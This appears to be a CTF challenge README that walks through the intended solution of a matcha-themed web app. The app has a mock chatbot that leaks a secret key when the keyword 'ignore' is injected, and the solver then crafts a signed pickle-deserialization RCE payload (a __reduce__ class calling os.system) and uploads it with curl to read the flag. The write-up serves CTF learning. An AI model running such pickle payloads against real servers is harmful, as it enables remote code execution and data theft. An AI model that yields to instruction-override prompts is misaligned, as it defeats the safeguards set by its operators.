## Main Vulnerabilities
- Pickle deserialization vulnerability
- Prompt injection-style logic (rule-based, no real LLM)
- Remote code execution(RCE) 
- File upload vulnerability
- ...and some Miscellaneous tricks hidden throughout

---

## Scenario
### 1. Ask MATCHA bot ‚Äî Steal the **SECRET**.
> This is prompt injection-style system. You can simply inject keyword `"ignore"` into your prompt to extract the secret key. 
> *(Note: It's implemented using simple hardcoded logic, not the actual OpenAI API, due to practical constraints in the CTF environment.)*

  <img src="https://github.com/user-attachments/assets/9257c097-292f-4160-9840-8155d593df90" width="32%" />
  <img src="https://github.com/user-attachments/assets/7f8a768c-080e-4ebf-9aac-fa012d8eb5b5" width="32%" />
  <img src="https://github.com/user-attachments/assets/b41d3833-cd1a-4a0e-9021-b104dd3cf11c" width="31.5%" />
</p>

- If you successfully make the MATCHA bot ignore the initial instruction that prohibits revealing the secret key, you'll receive the following encoded string: `zaqwedsMrfvMuytgbnmMqazescMrfvbMjkiuyhnm,M_WasdeszxWtfcWiuygvbnWesztdcWygvbWklpoijnm,`
  - You can deduce the meaning of this string using your keyboard layout ‚Üí `pickle_tickle`
  - This is the secret key used to generate the **HMAC signature**, which is essential for the following `curl`-based exploit afterwards.
  - And since the string contains "pickle", it should remind you of the **pickle deserialization vulnerability**.

---

### 2. Upload function
> You can upload your matcha dessert picture using the `UPLOAD` button, and view your submitted files via the `MY SUBMISSIONS` button.

<p align="left">

</p>

- The server filters file extensions ‚Äî only `.jpg`, `.png`, and `.pkl` files are allowed.
- Files with `.jpg` or `.png` extensions are displayed on the site using the `MY SUBMISSIONS` button.
- However, `.pkl` files **cannot be uploaded via the browser UI**, nor are they displayed.
- - The attacker must recognize this limitation and switch to using the `curl` command from the terminal to upload `.pkl` file afterwards.

  <img src="https://github.com/user-attachments/assets/febec0ae-06f3-4478-9d17-14fe29ee8140" />
</p>

- You can infer the path where your submission files are stored via DevTools (F12): `/uploads/{filename}`
  - However, this is not the actual full path ‚Äî the real path is `app/uploads/{filename}`
  - You can find this clue from the UI element shown below:

</p>

### 3. Exploit 
> Using the file path and SECRET key you obtained in the previous step, you can craft an RCE payload as shown below. 
> The location of `flag.txt` is provided in advance ‚Äî it's in the same directory as `app.py`.

```python
# attack scenario (test)
# this is the script file which the attacker uses in his local PC
import pickle, os, hashlib, hmac

# print(os.path.abspath("app/uploads"))
UPLOAD_DIR = '/app/uploads'
uuid = "d7fead..."

class RCE:
    def __reduce__(self):
        return (os.system, (f"cat /flag.txt > {UPLOAD_DIR}/{uuid}/hacked.txt",))

SECRET_KEY = "pickle_tickle"
payload = pickle.dumps(RCE())
sig = hmac.new(SECRET_KEY.encode(), payload, hashlib.sha256).hexdigest()

with open("malicious.pkl", "wb") as f:
    f.write(payload)

print(f"HMAC signature: {sig}")
```
---

### 4. Upload the `.pkl` via `$curl`
> Use the curl command to upload your crafted pickle file to `app/uploads/`. Upon upload, the RCE will trigger automatically and execute the injected command.
> Note: The HMAC signature may differ from the example depending on your script written in step 3.

```bash
curl -X POST http://127.0.0.1:5000/upload \
  -F "file=@malicious.pkl" \
  -F "sig=90c67..." \
  -F "uuid=d7fead..."
```

</p>

### 5. Catch the FLAG üö©
> Check out the `.txt` file you uploaded via the RCE attack in the MY SUBMISSIONS section.
> Once you click the file, the flag will be revealed as below:

## Tricks & "Intended" Unintended Elements
### 1. Hint for pickle vulnerability

- Here are some icons that redirects you to various SNS platforms ‚Äî but the final icon leads somewhere special.
- Clicking the last icon redirects you to a site called *‚ÄúA jar of pickles.‚Äù*
- This is a subtle hint toward the pickle vulnerability, offering an easier discovery path than the prompt injection above.

### 2. Intended "Trap" Functionality

- There's also a section where you can enter text and "send" it to the server.
- However, this function is a decoy ‚Äî there‚Äôs no actual logic implemented either on the client or server side.
- It‚Äôs intentionally designed to mislead attackers into thinking there might be an XSS or another exploitable feature.
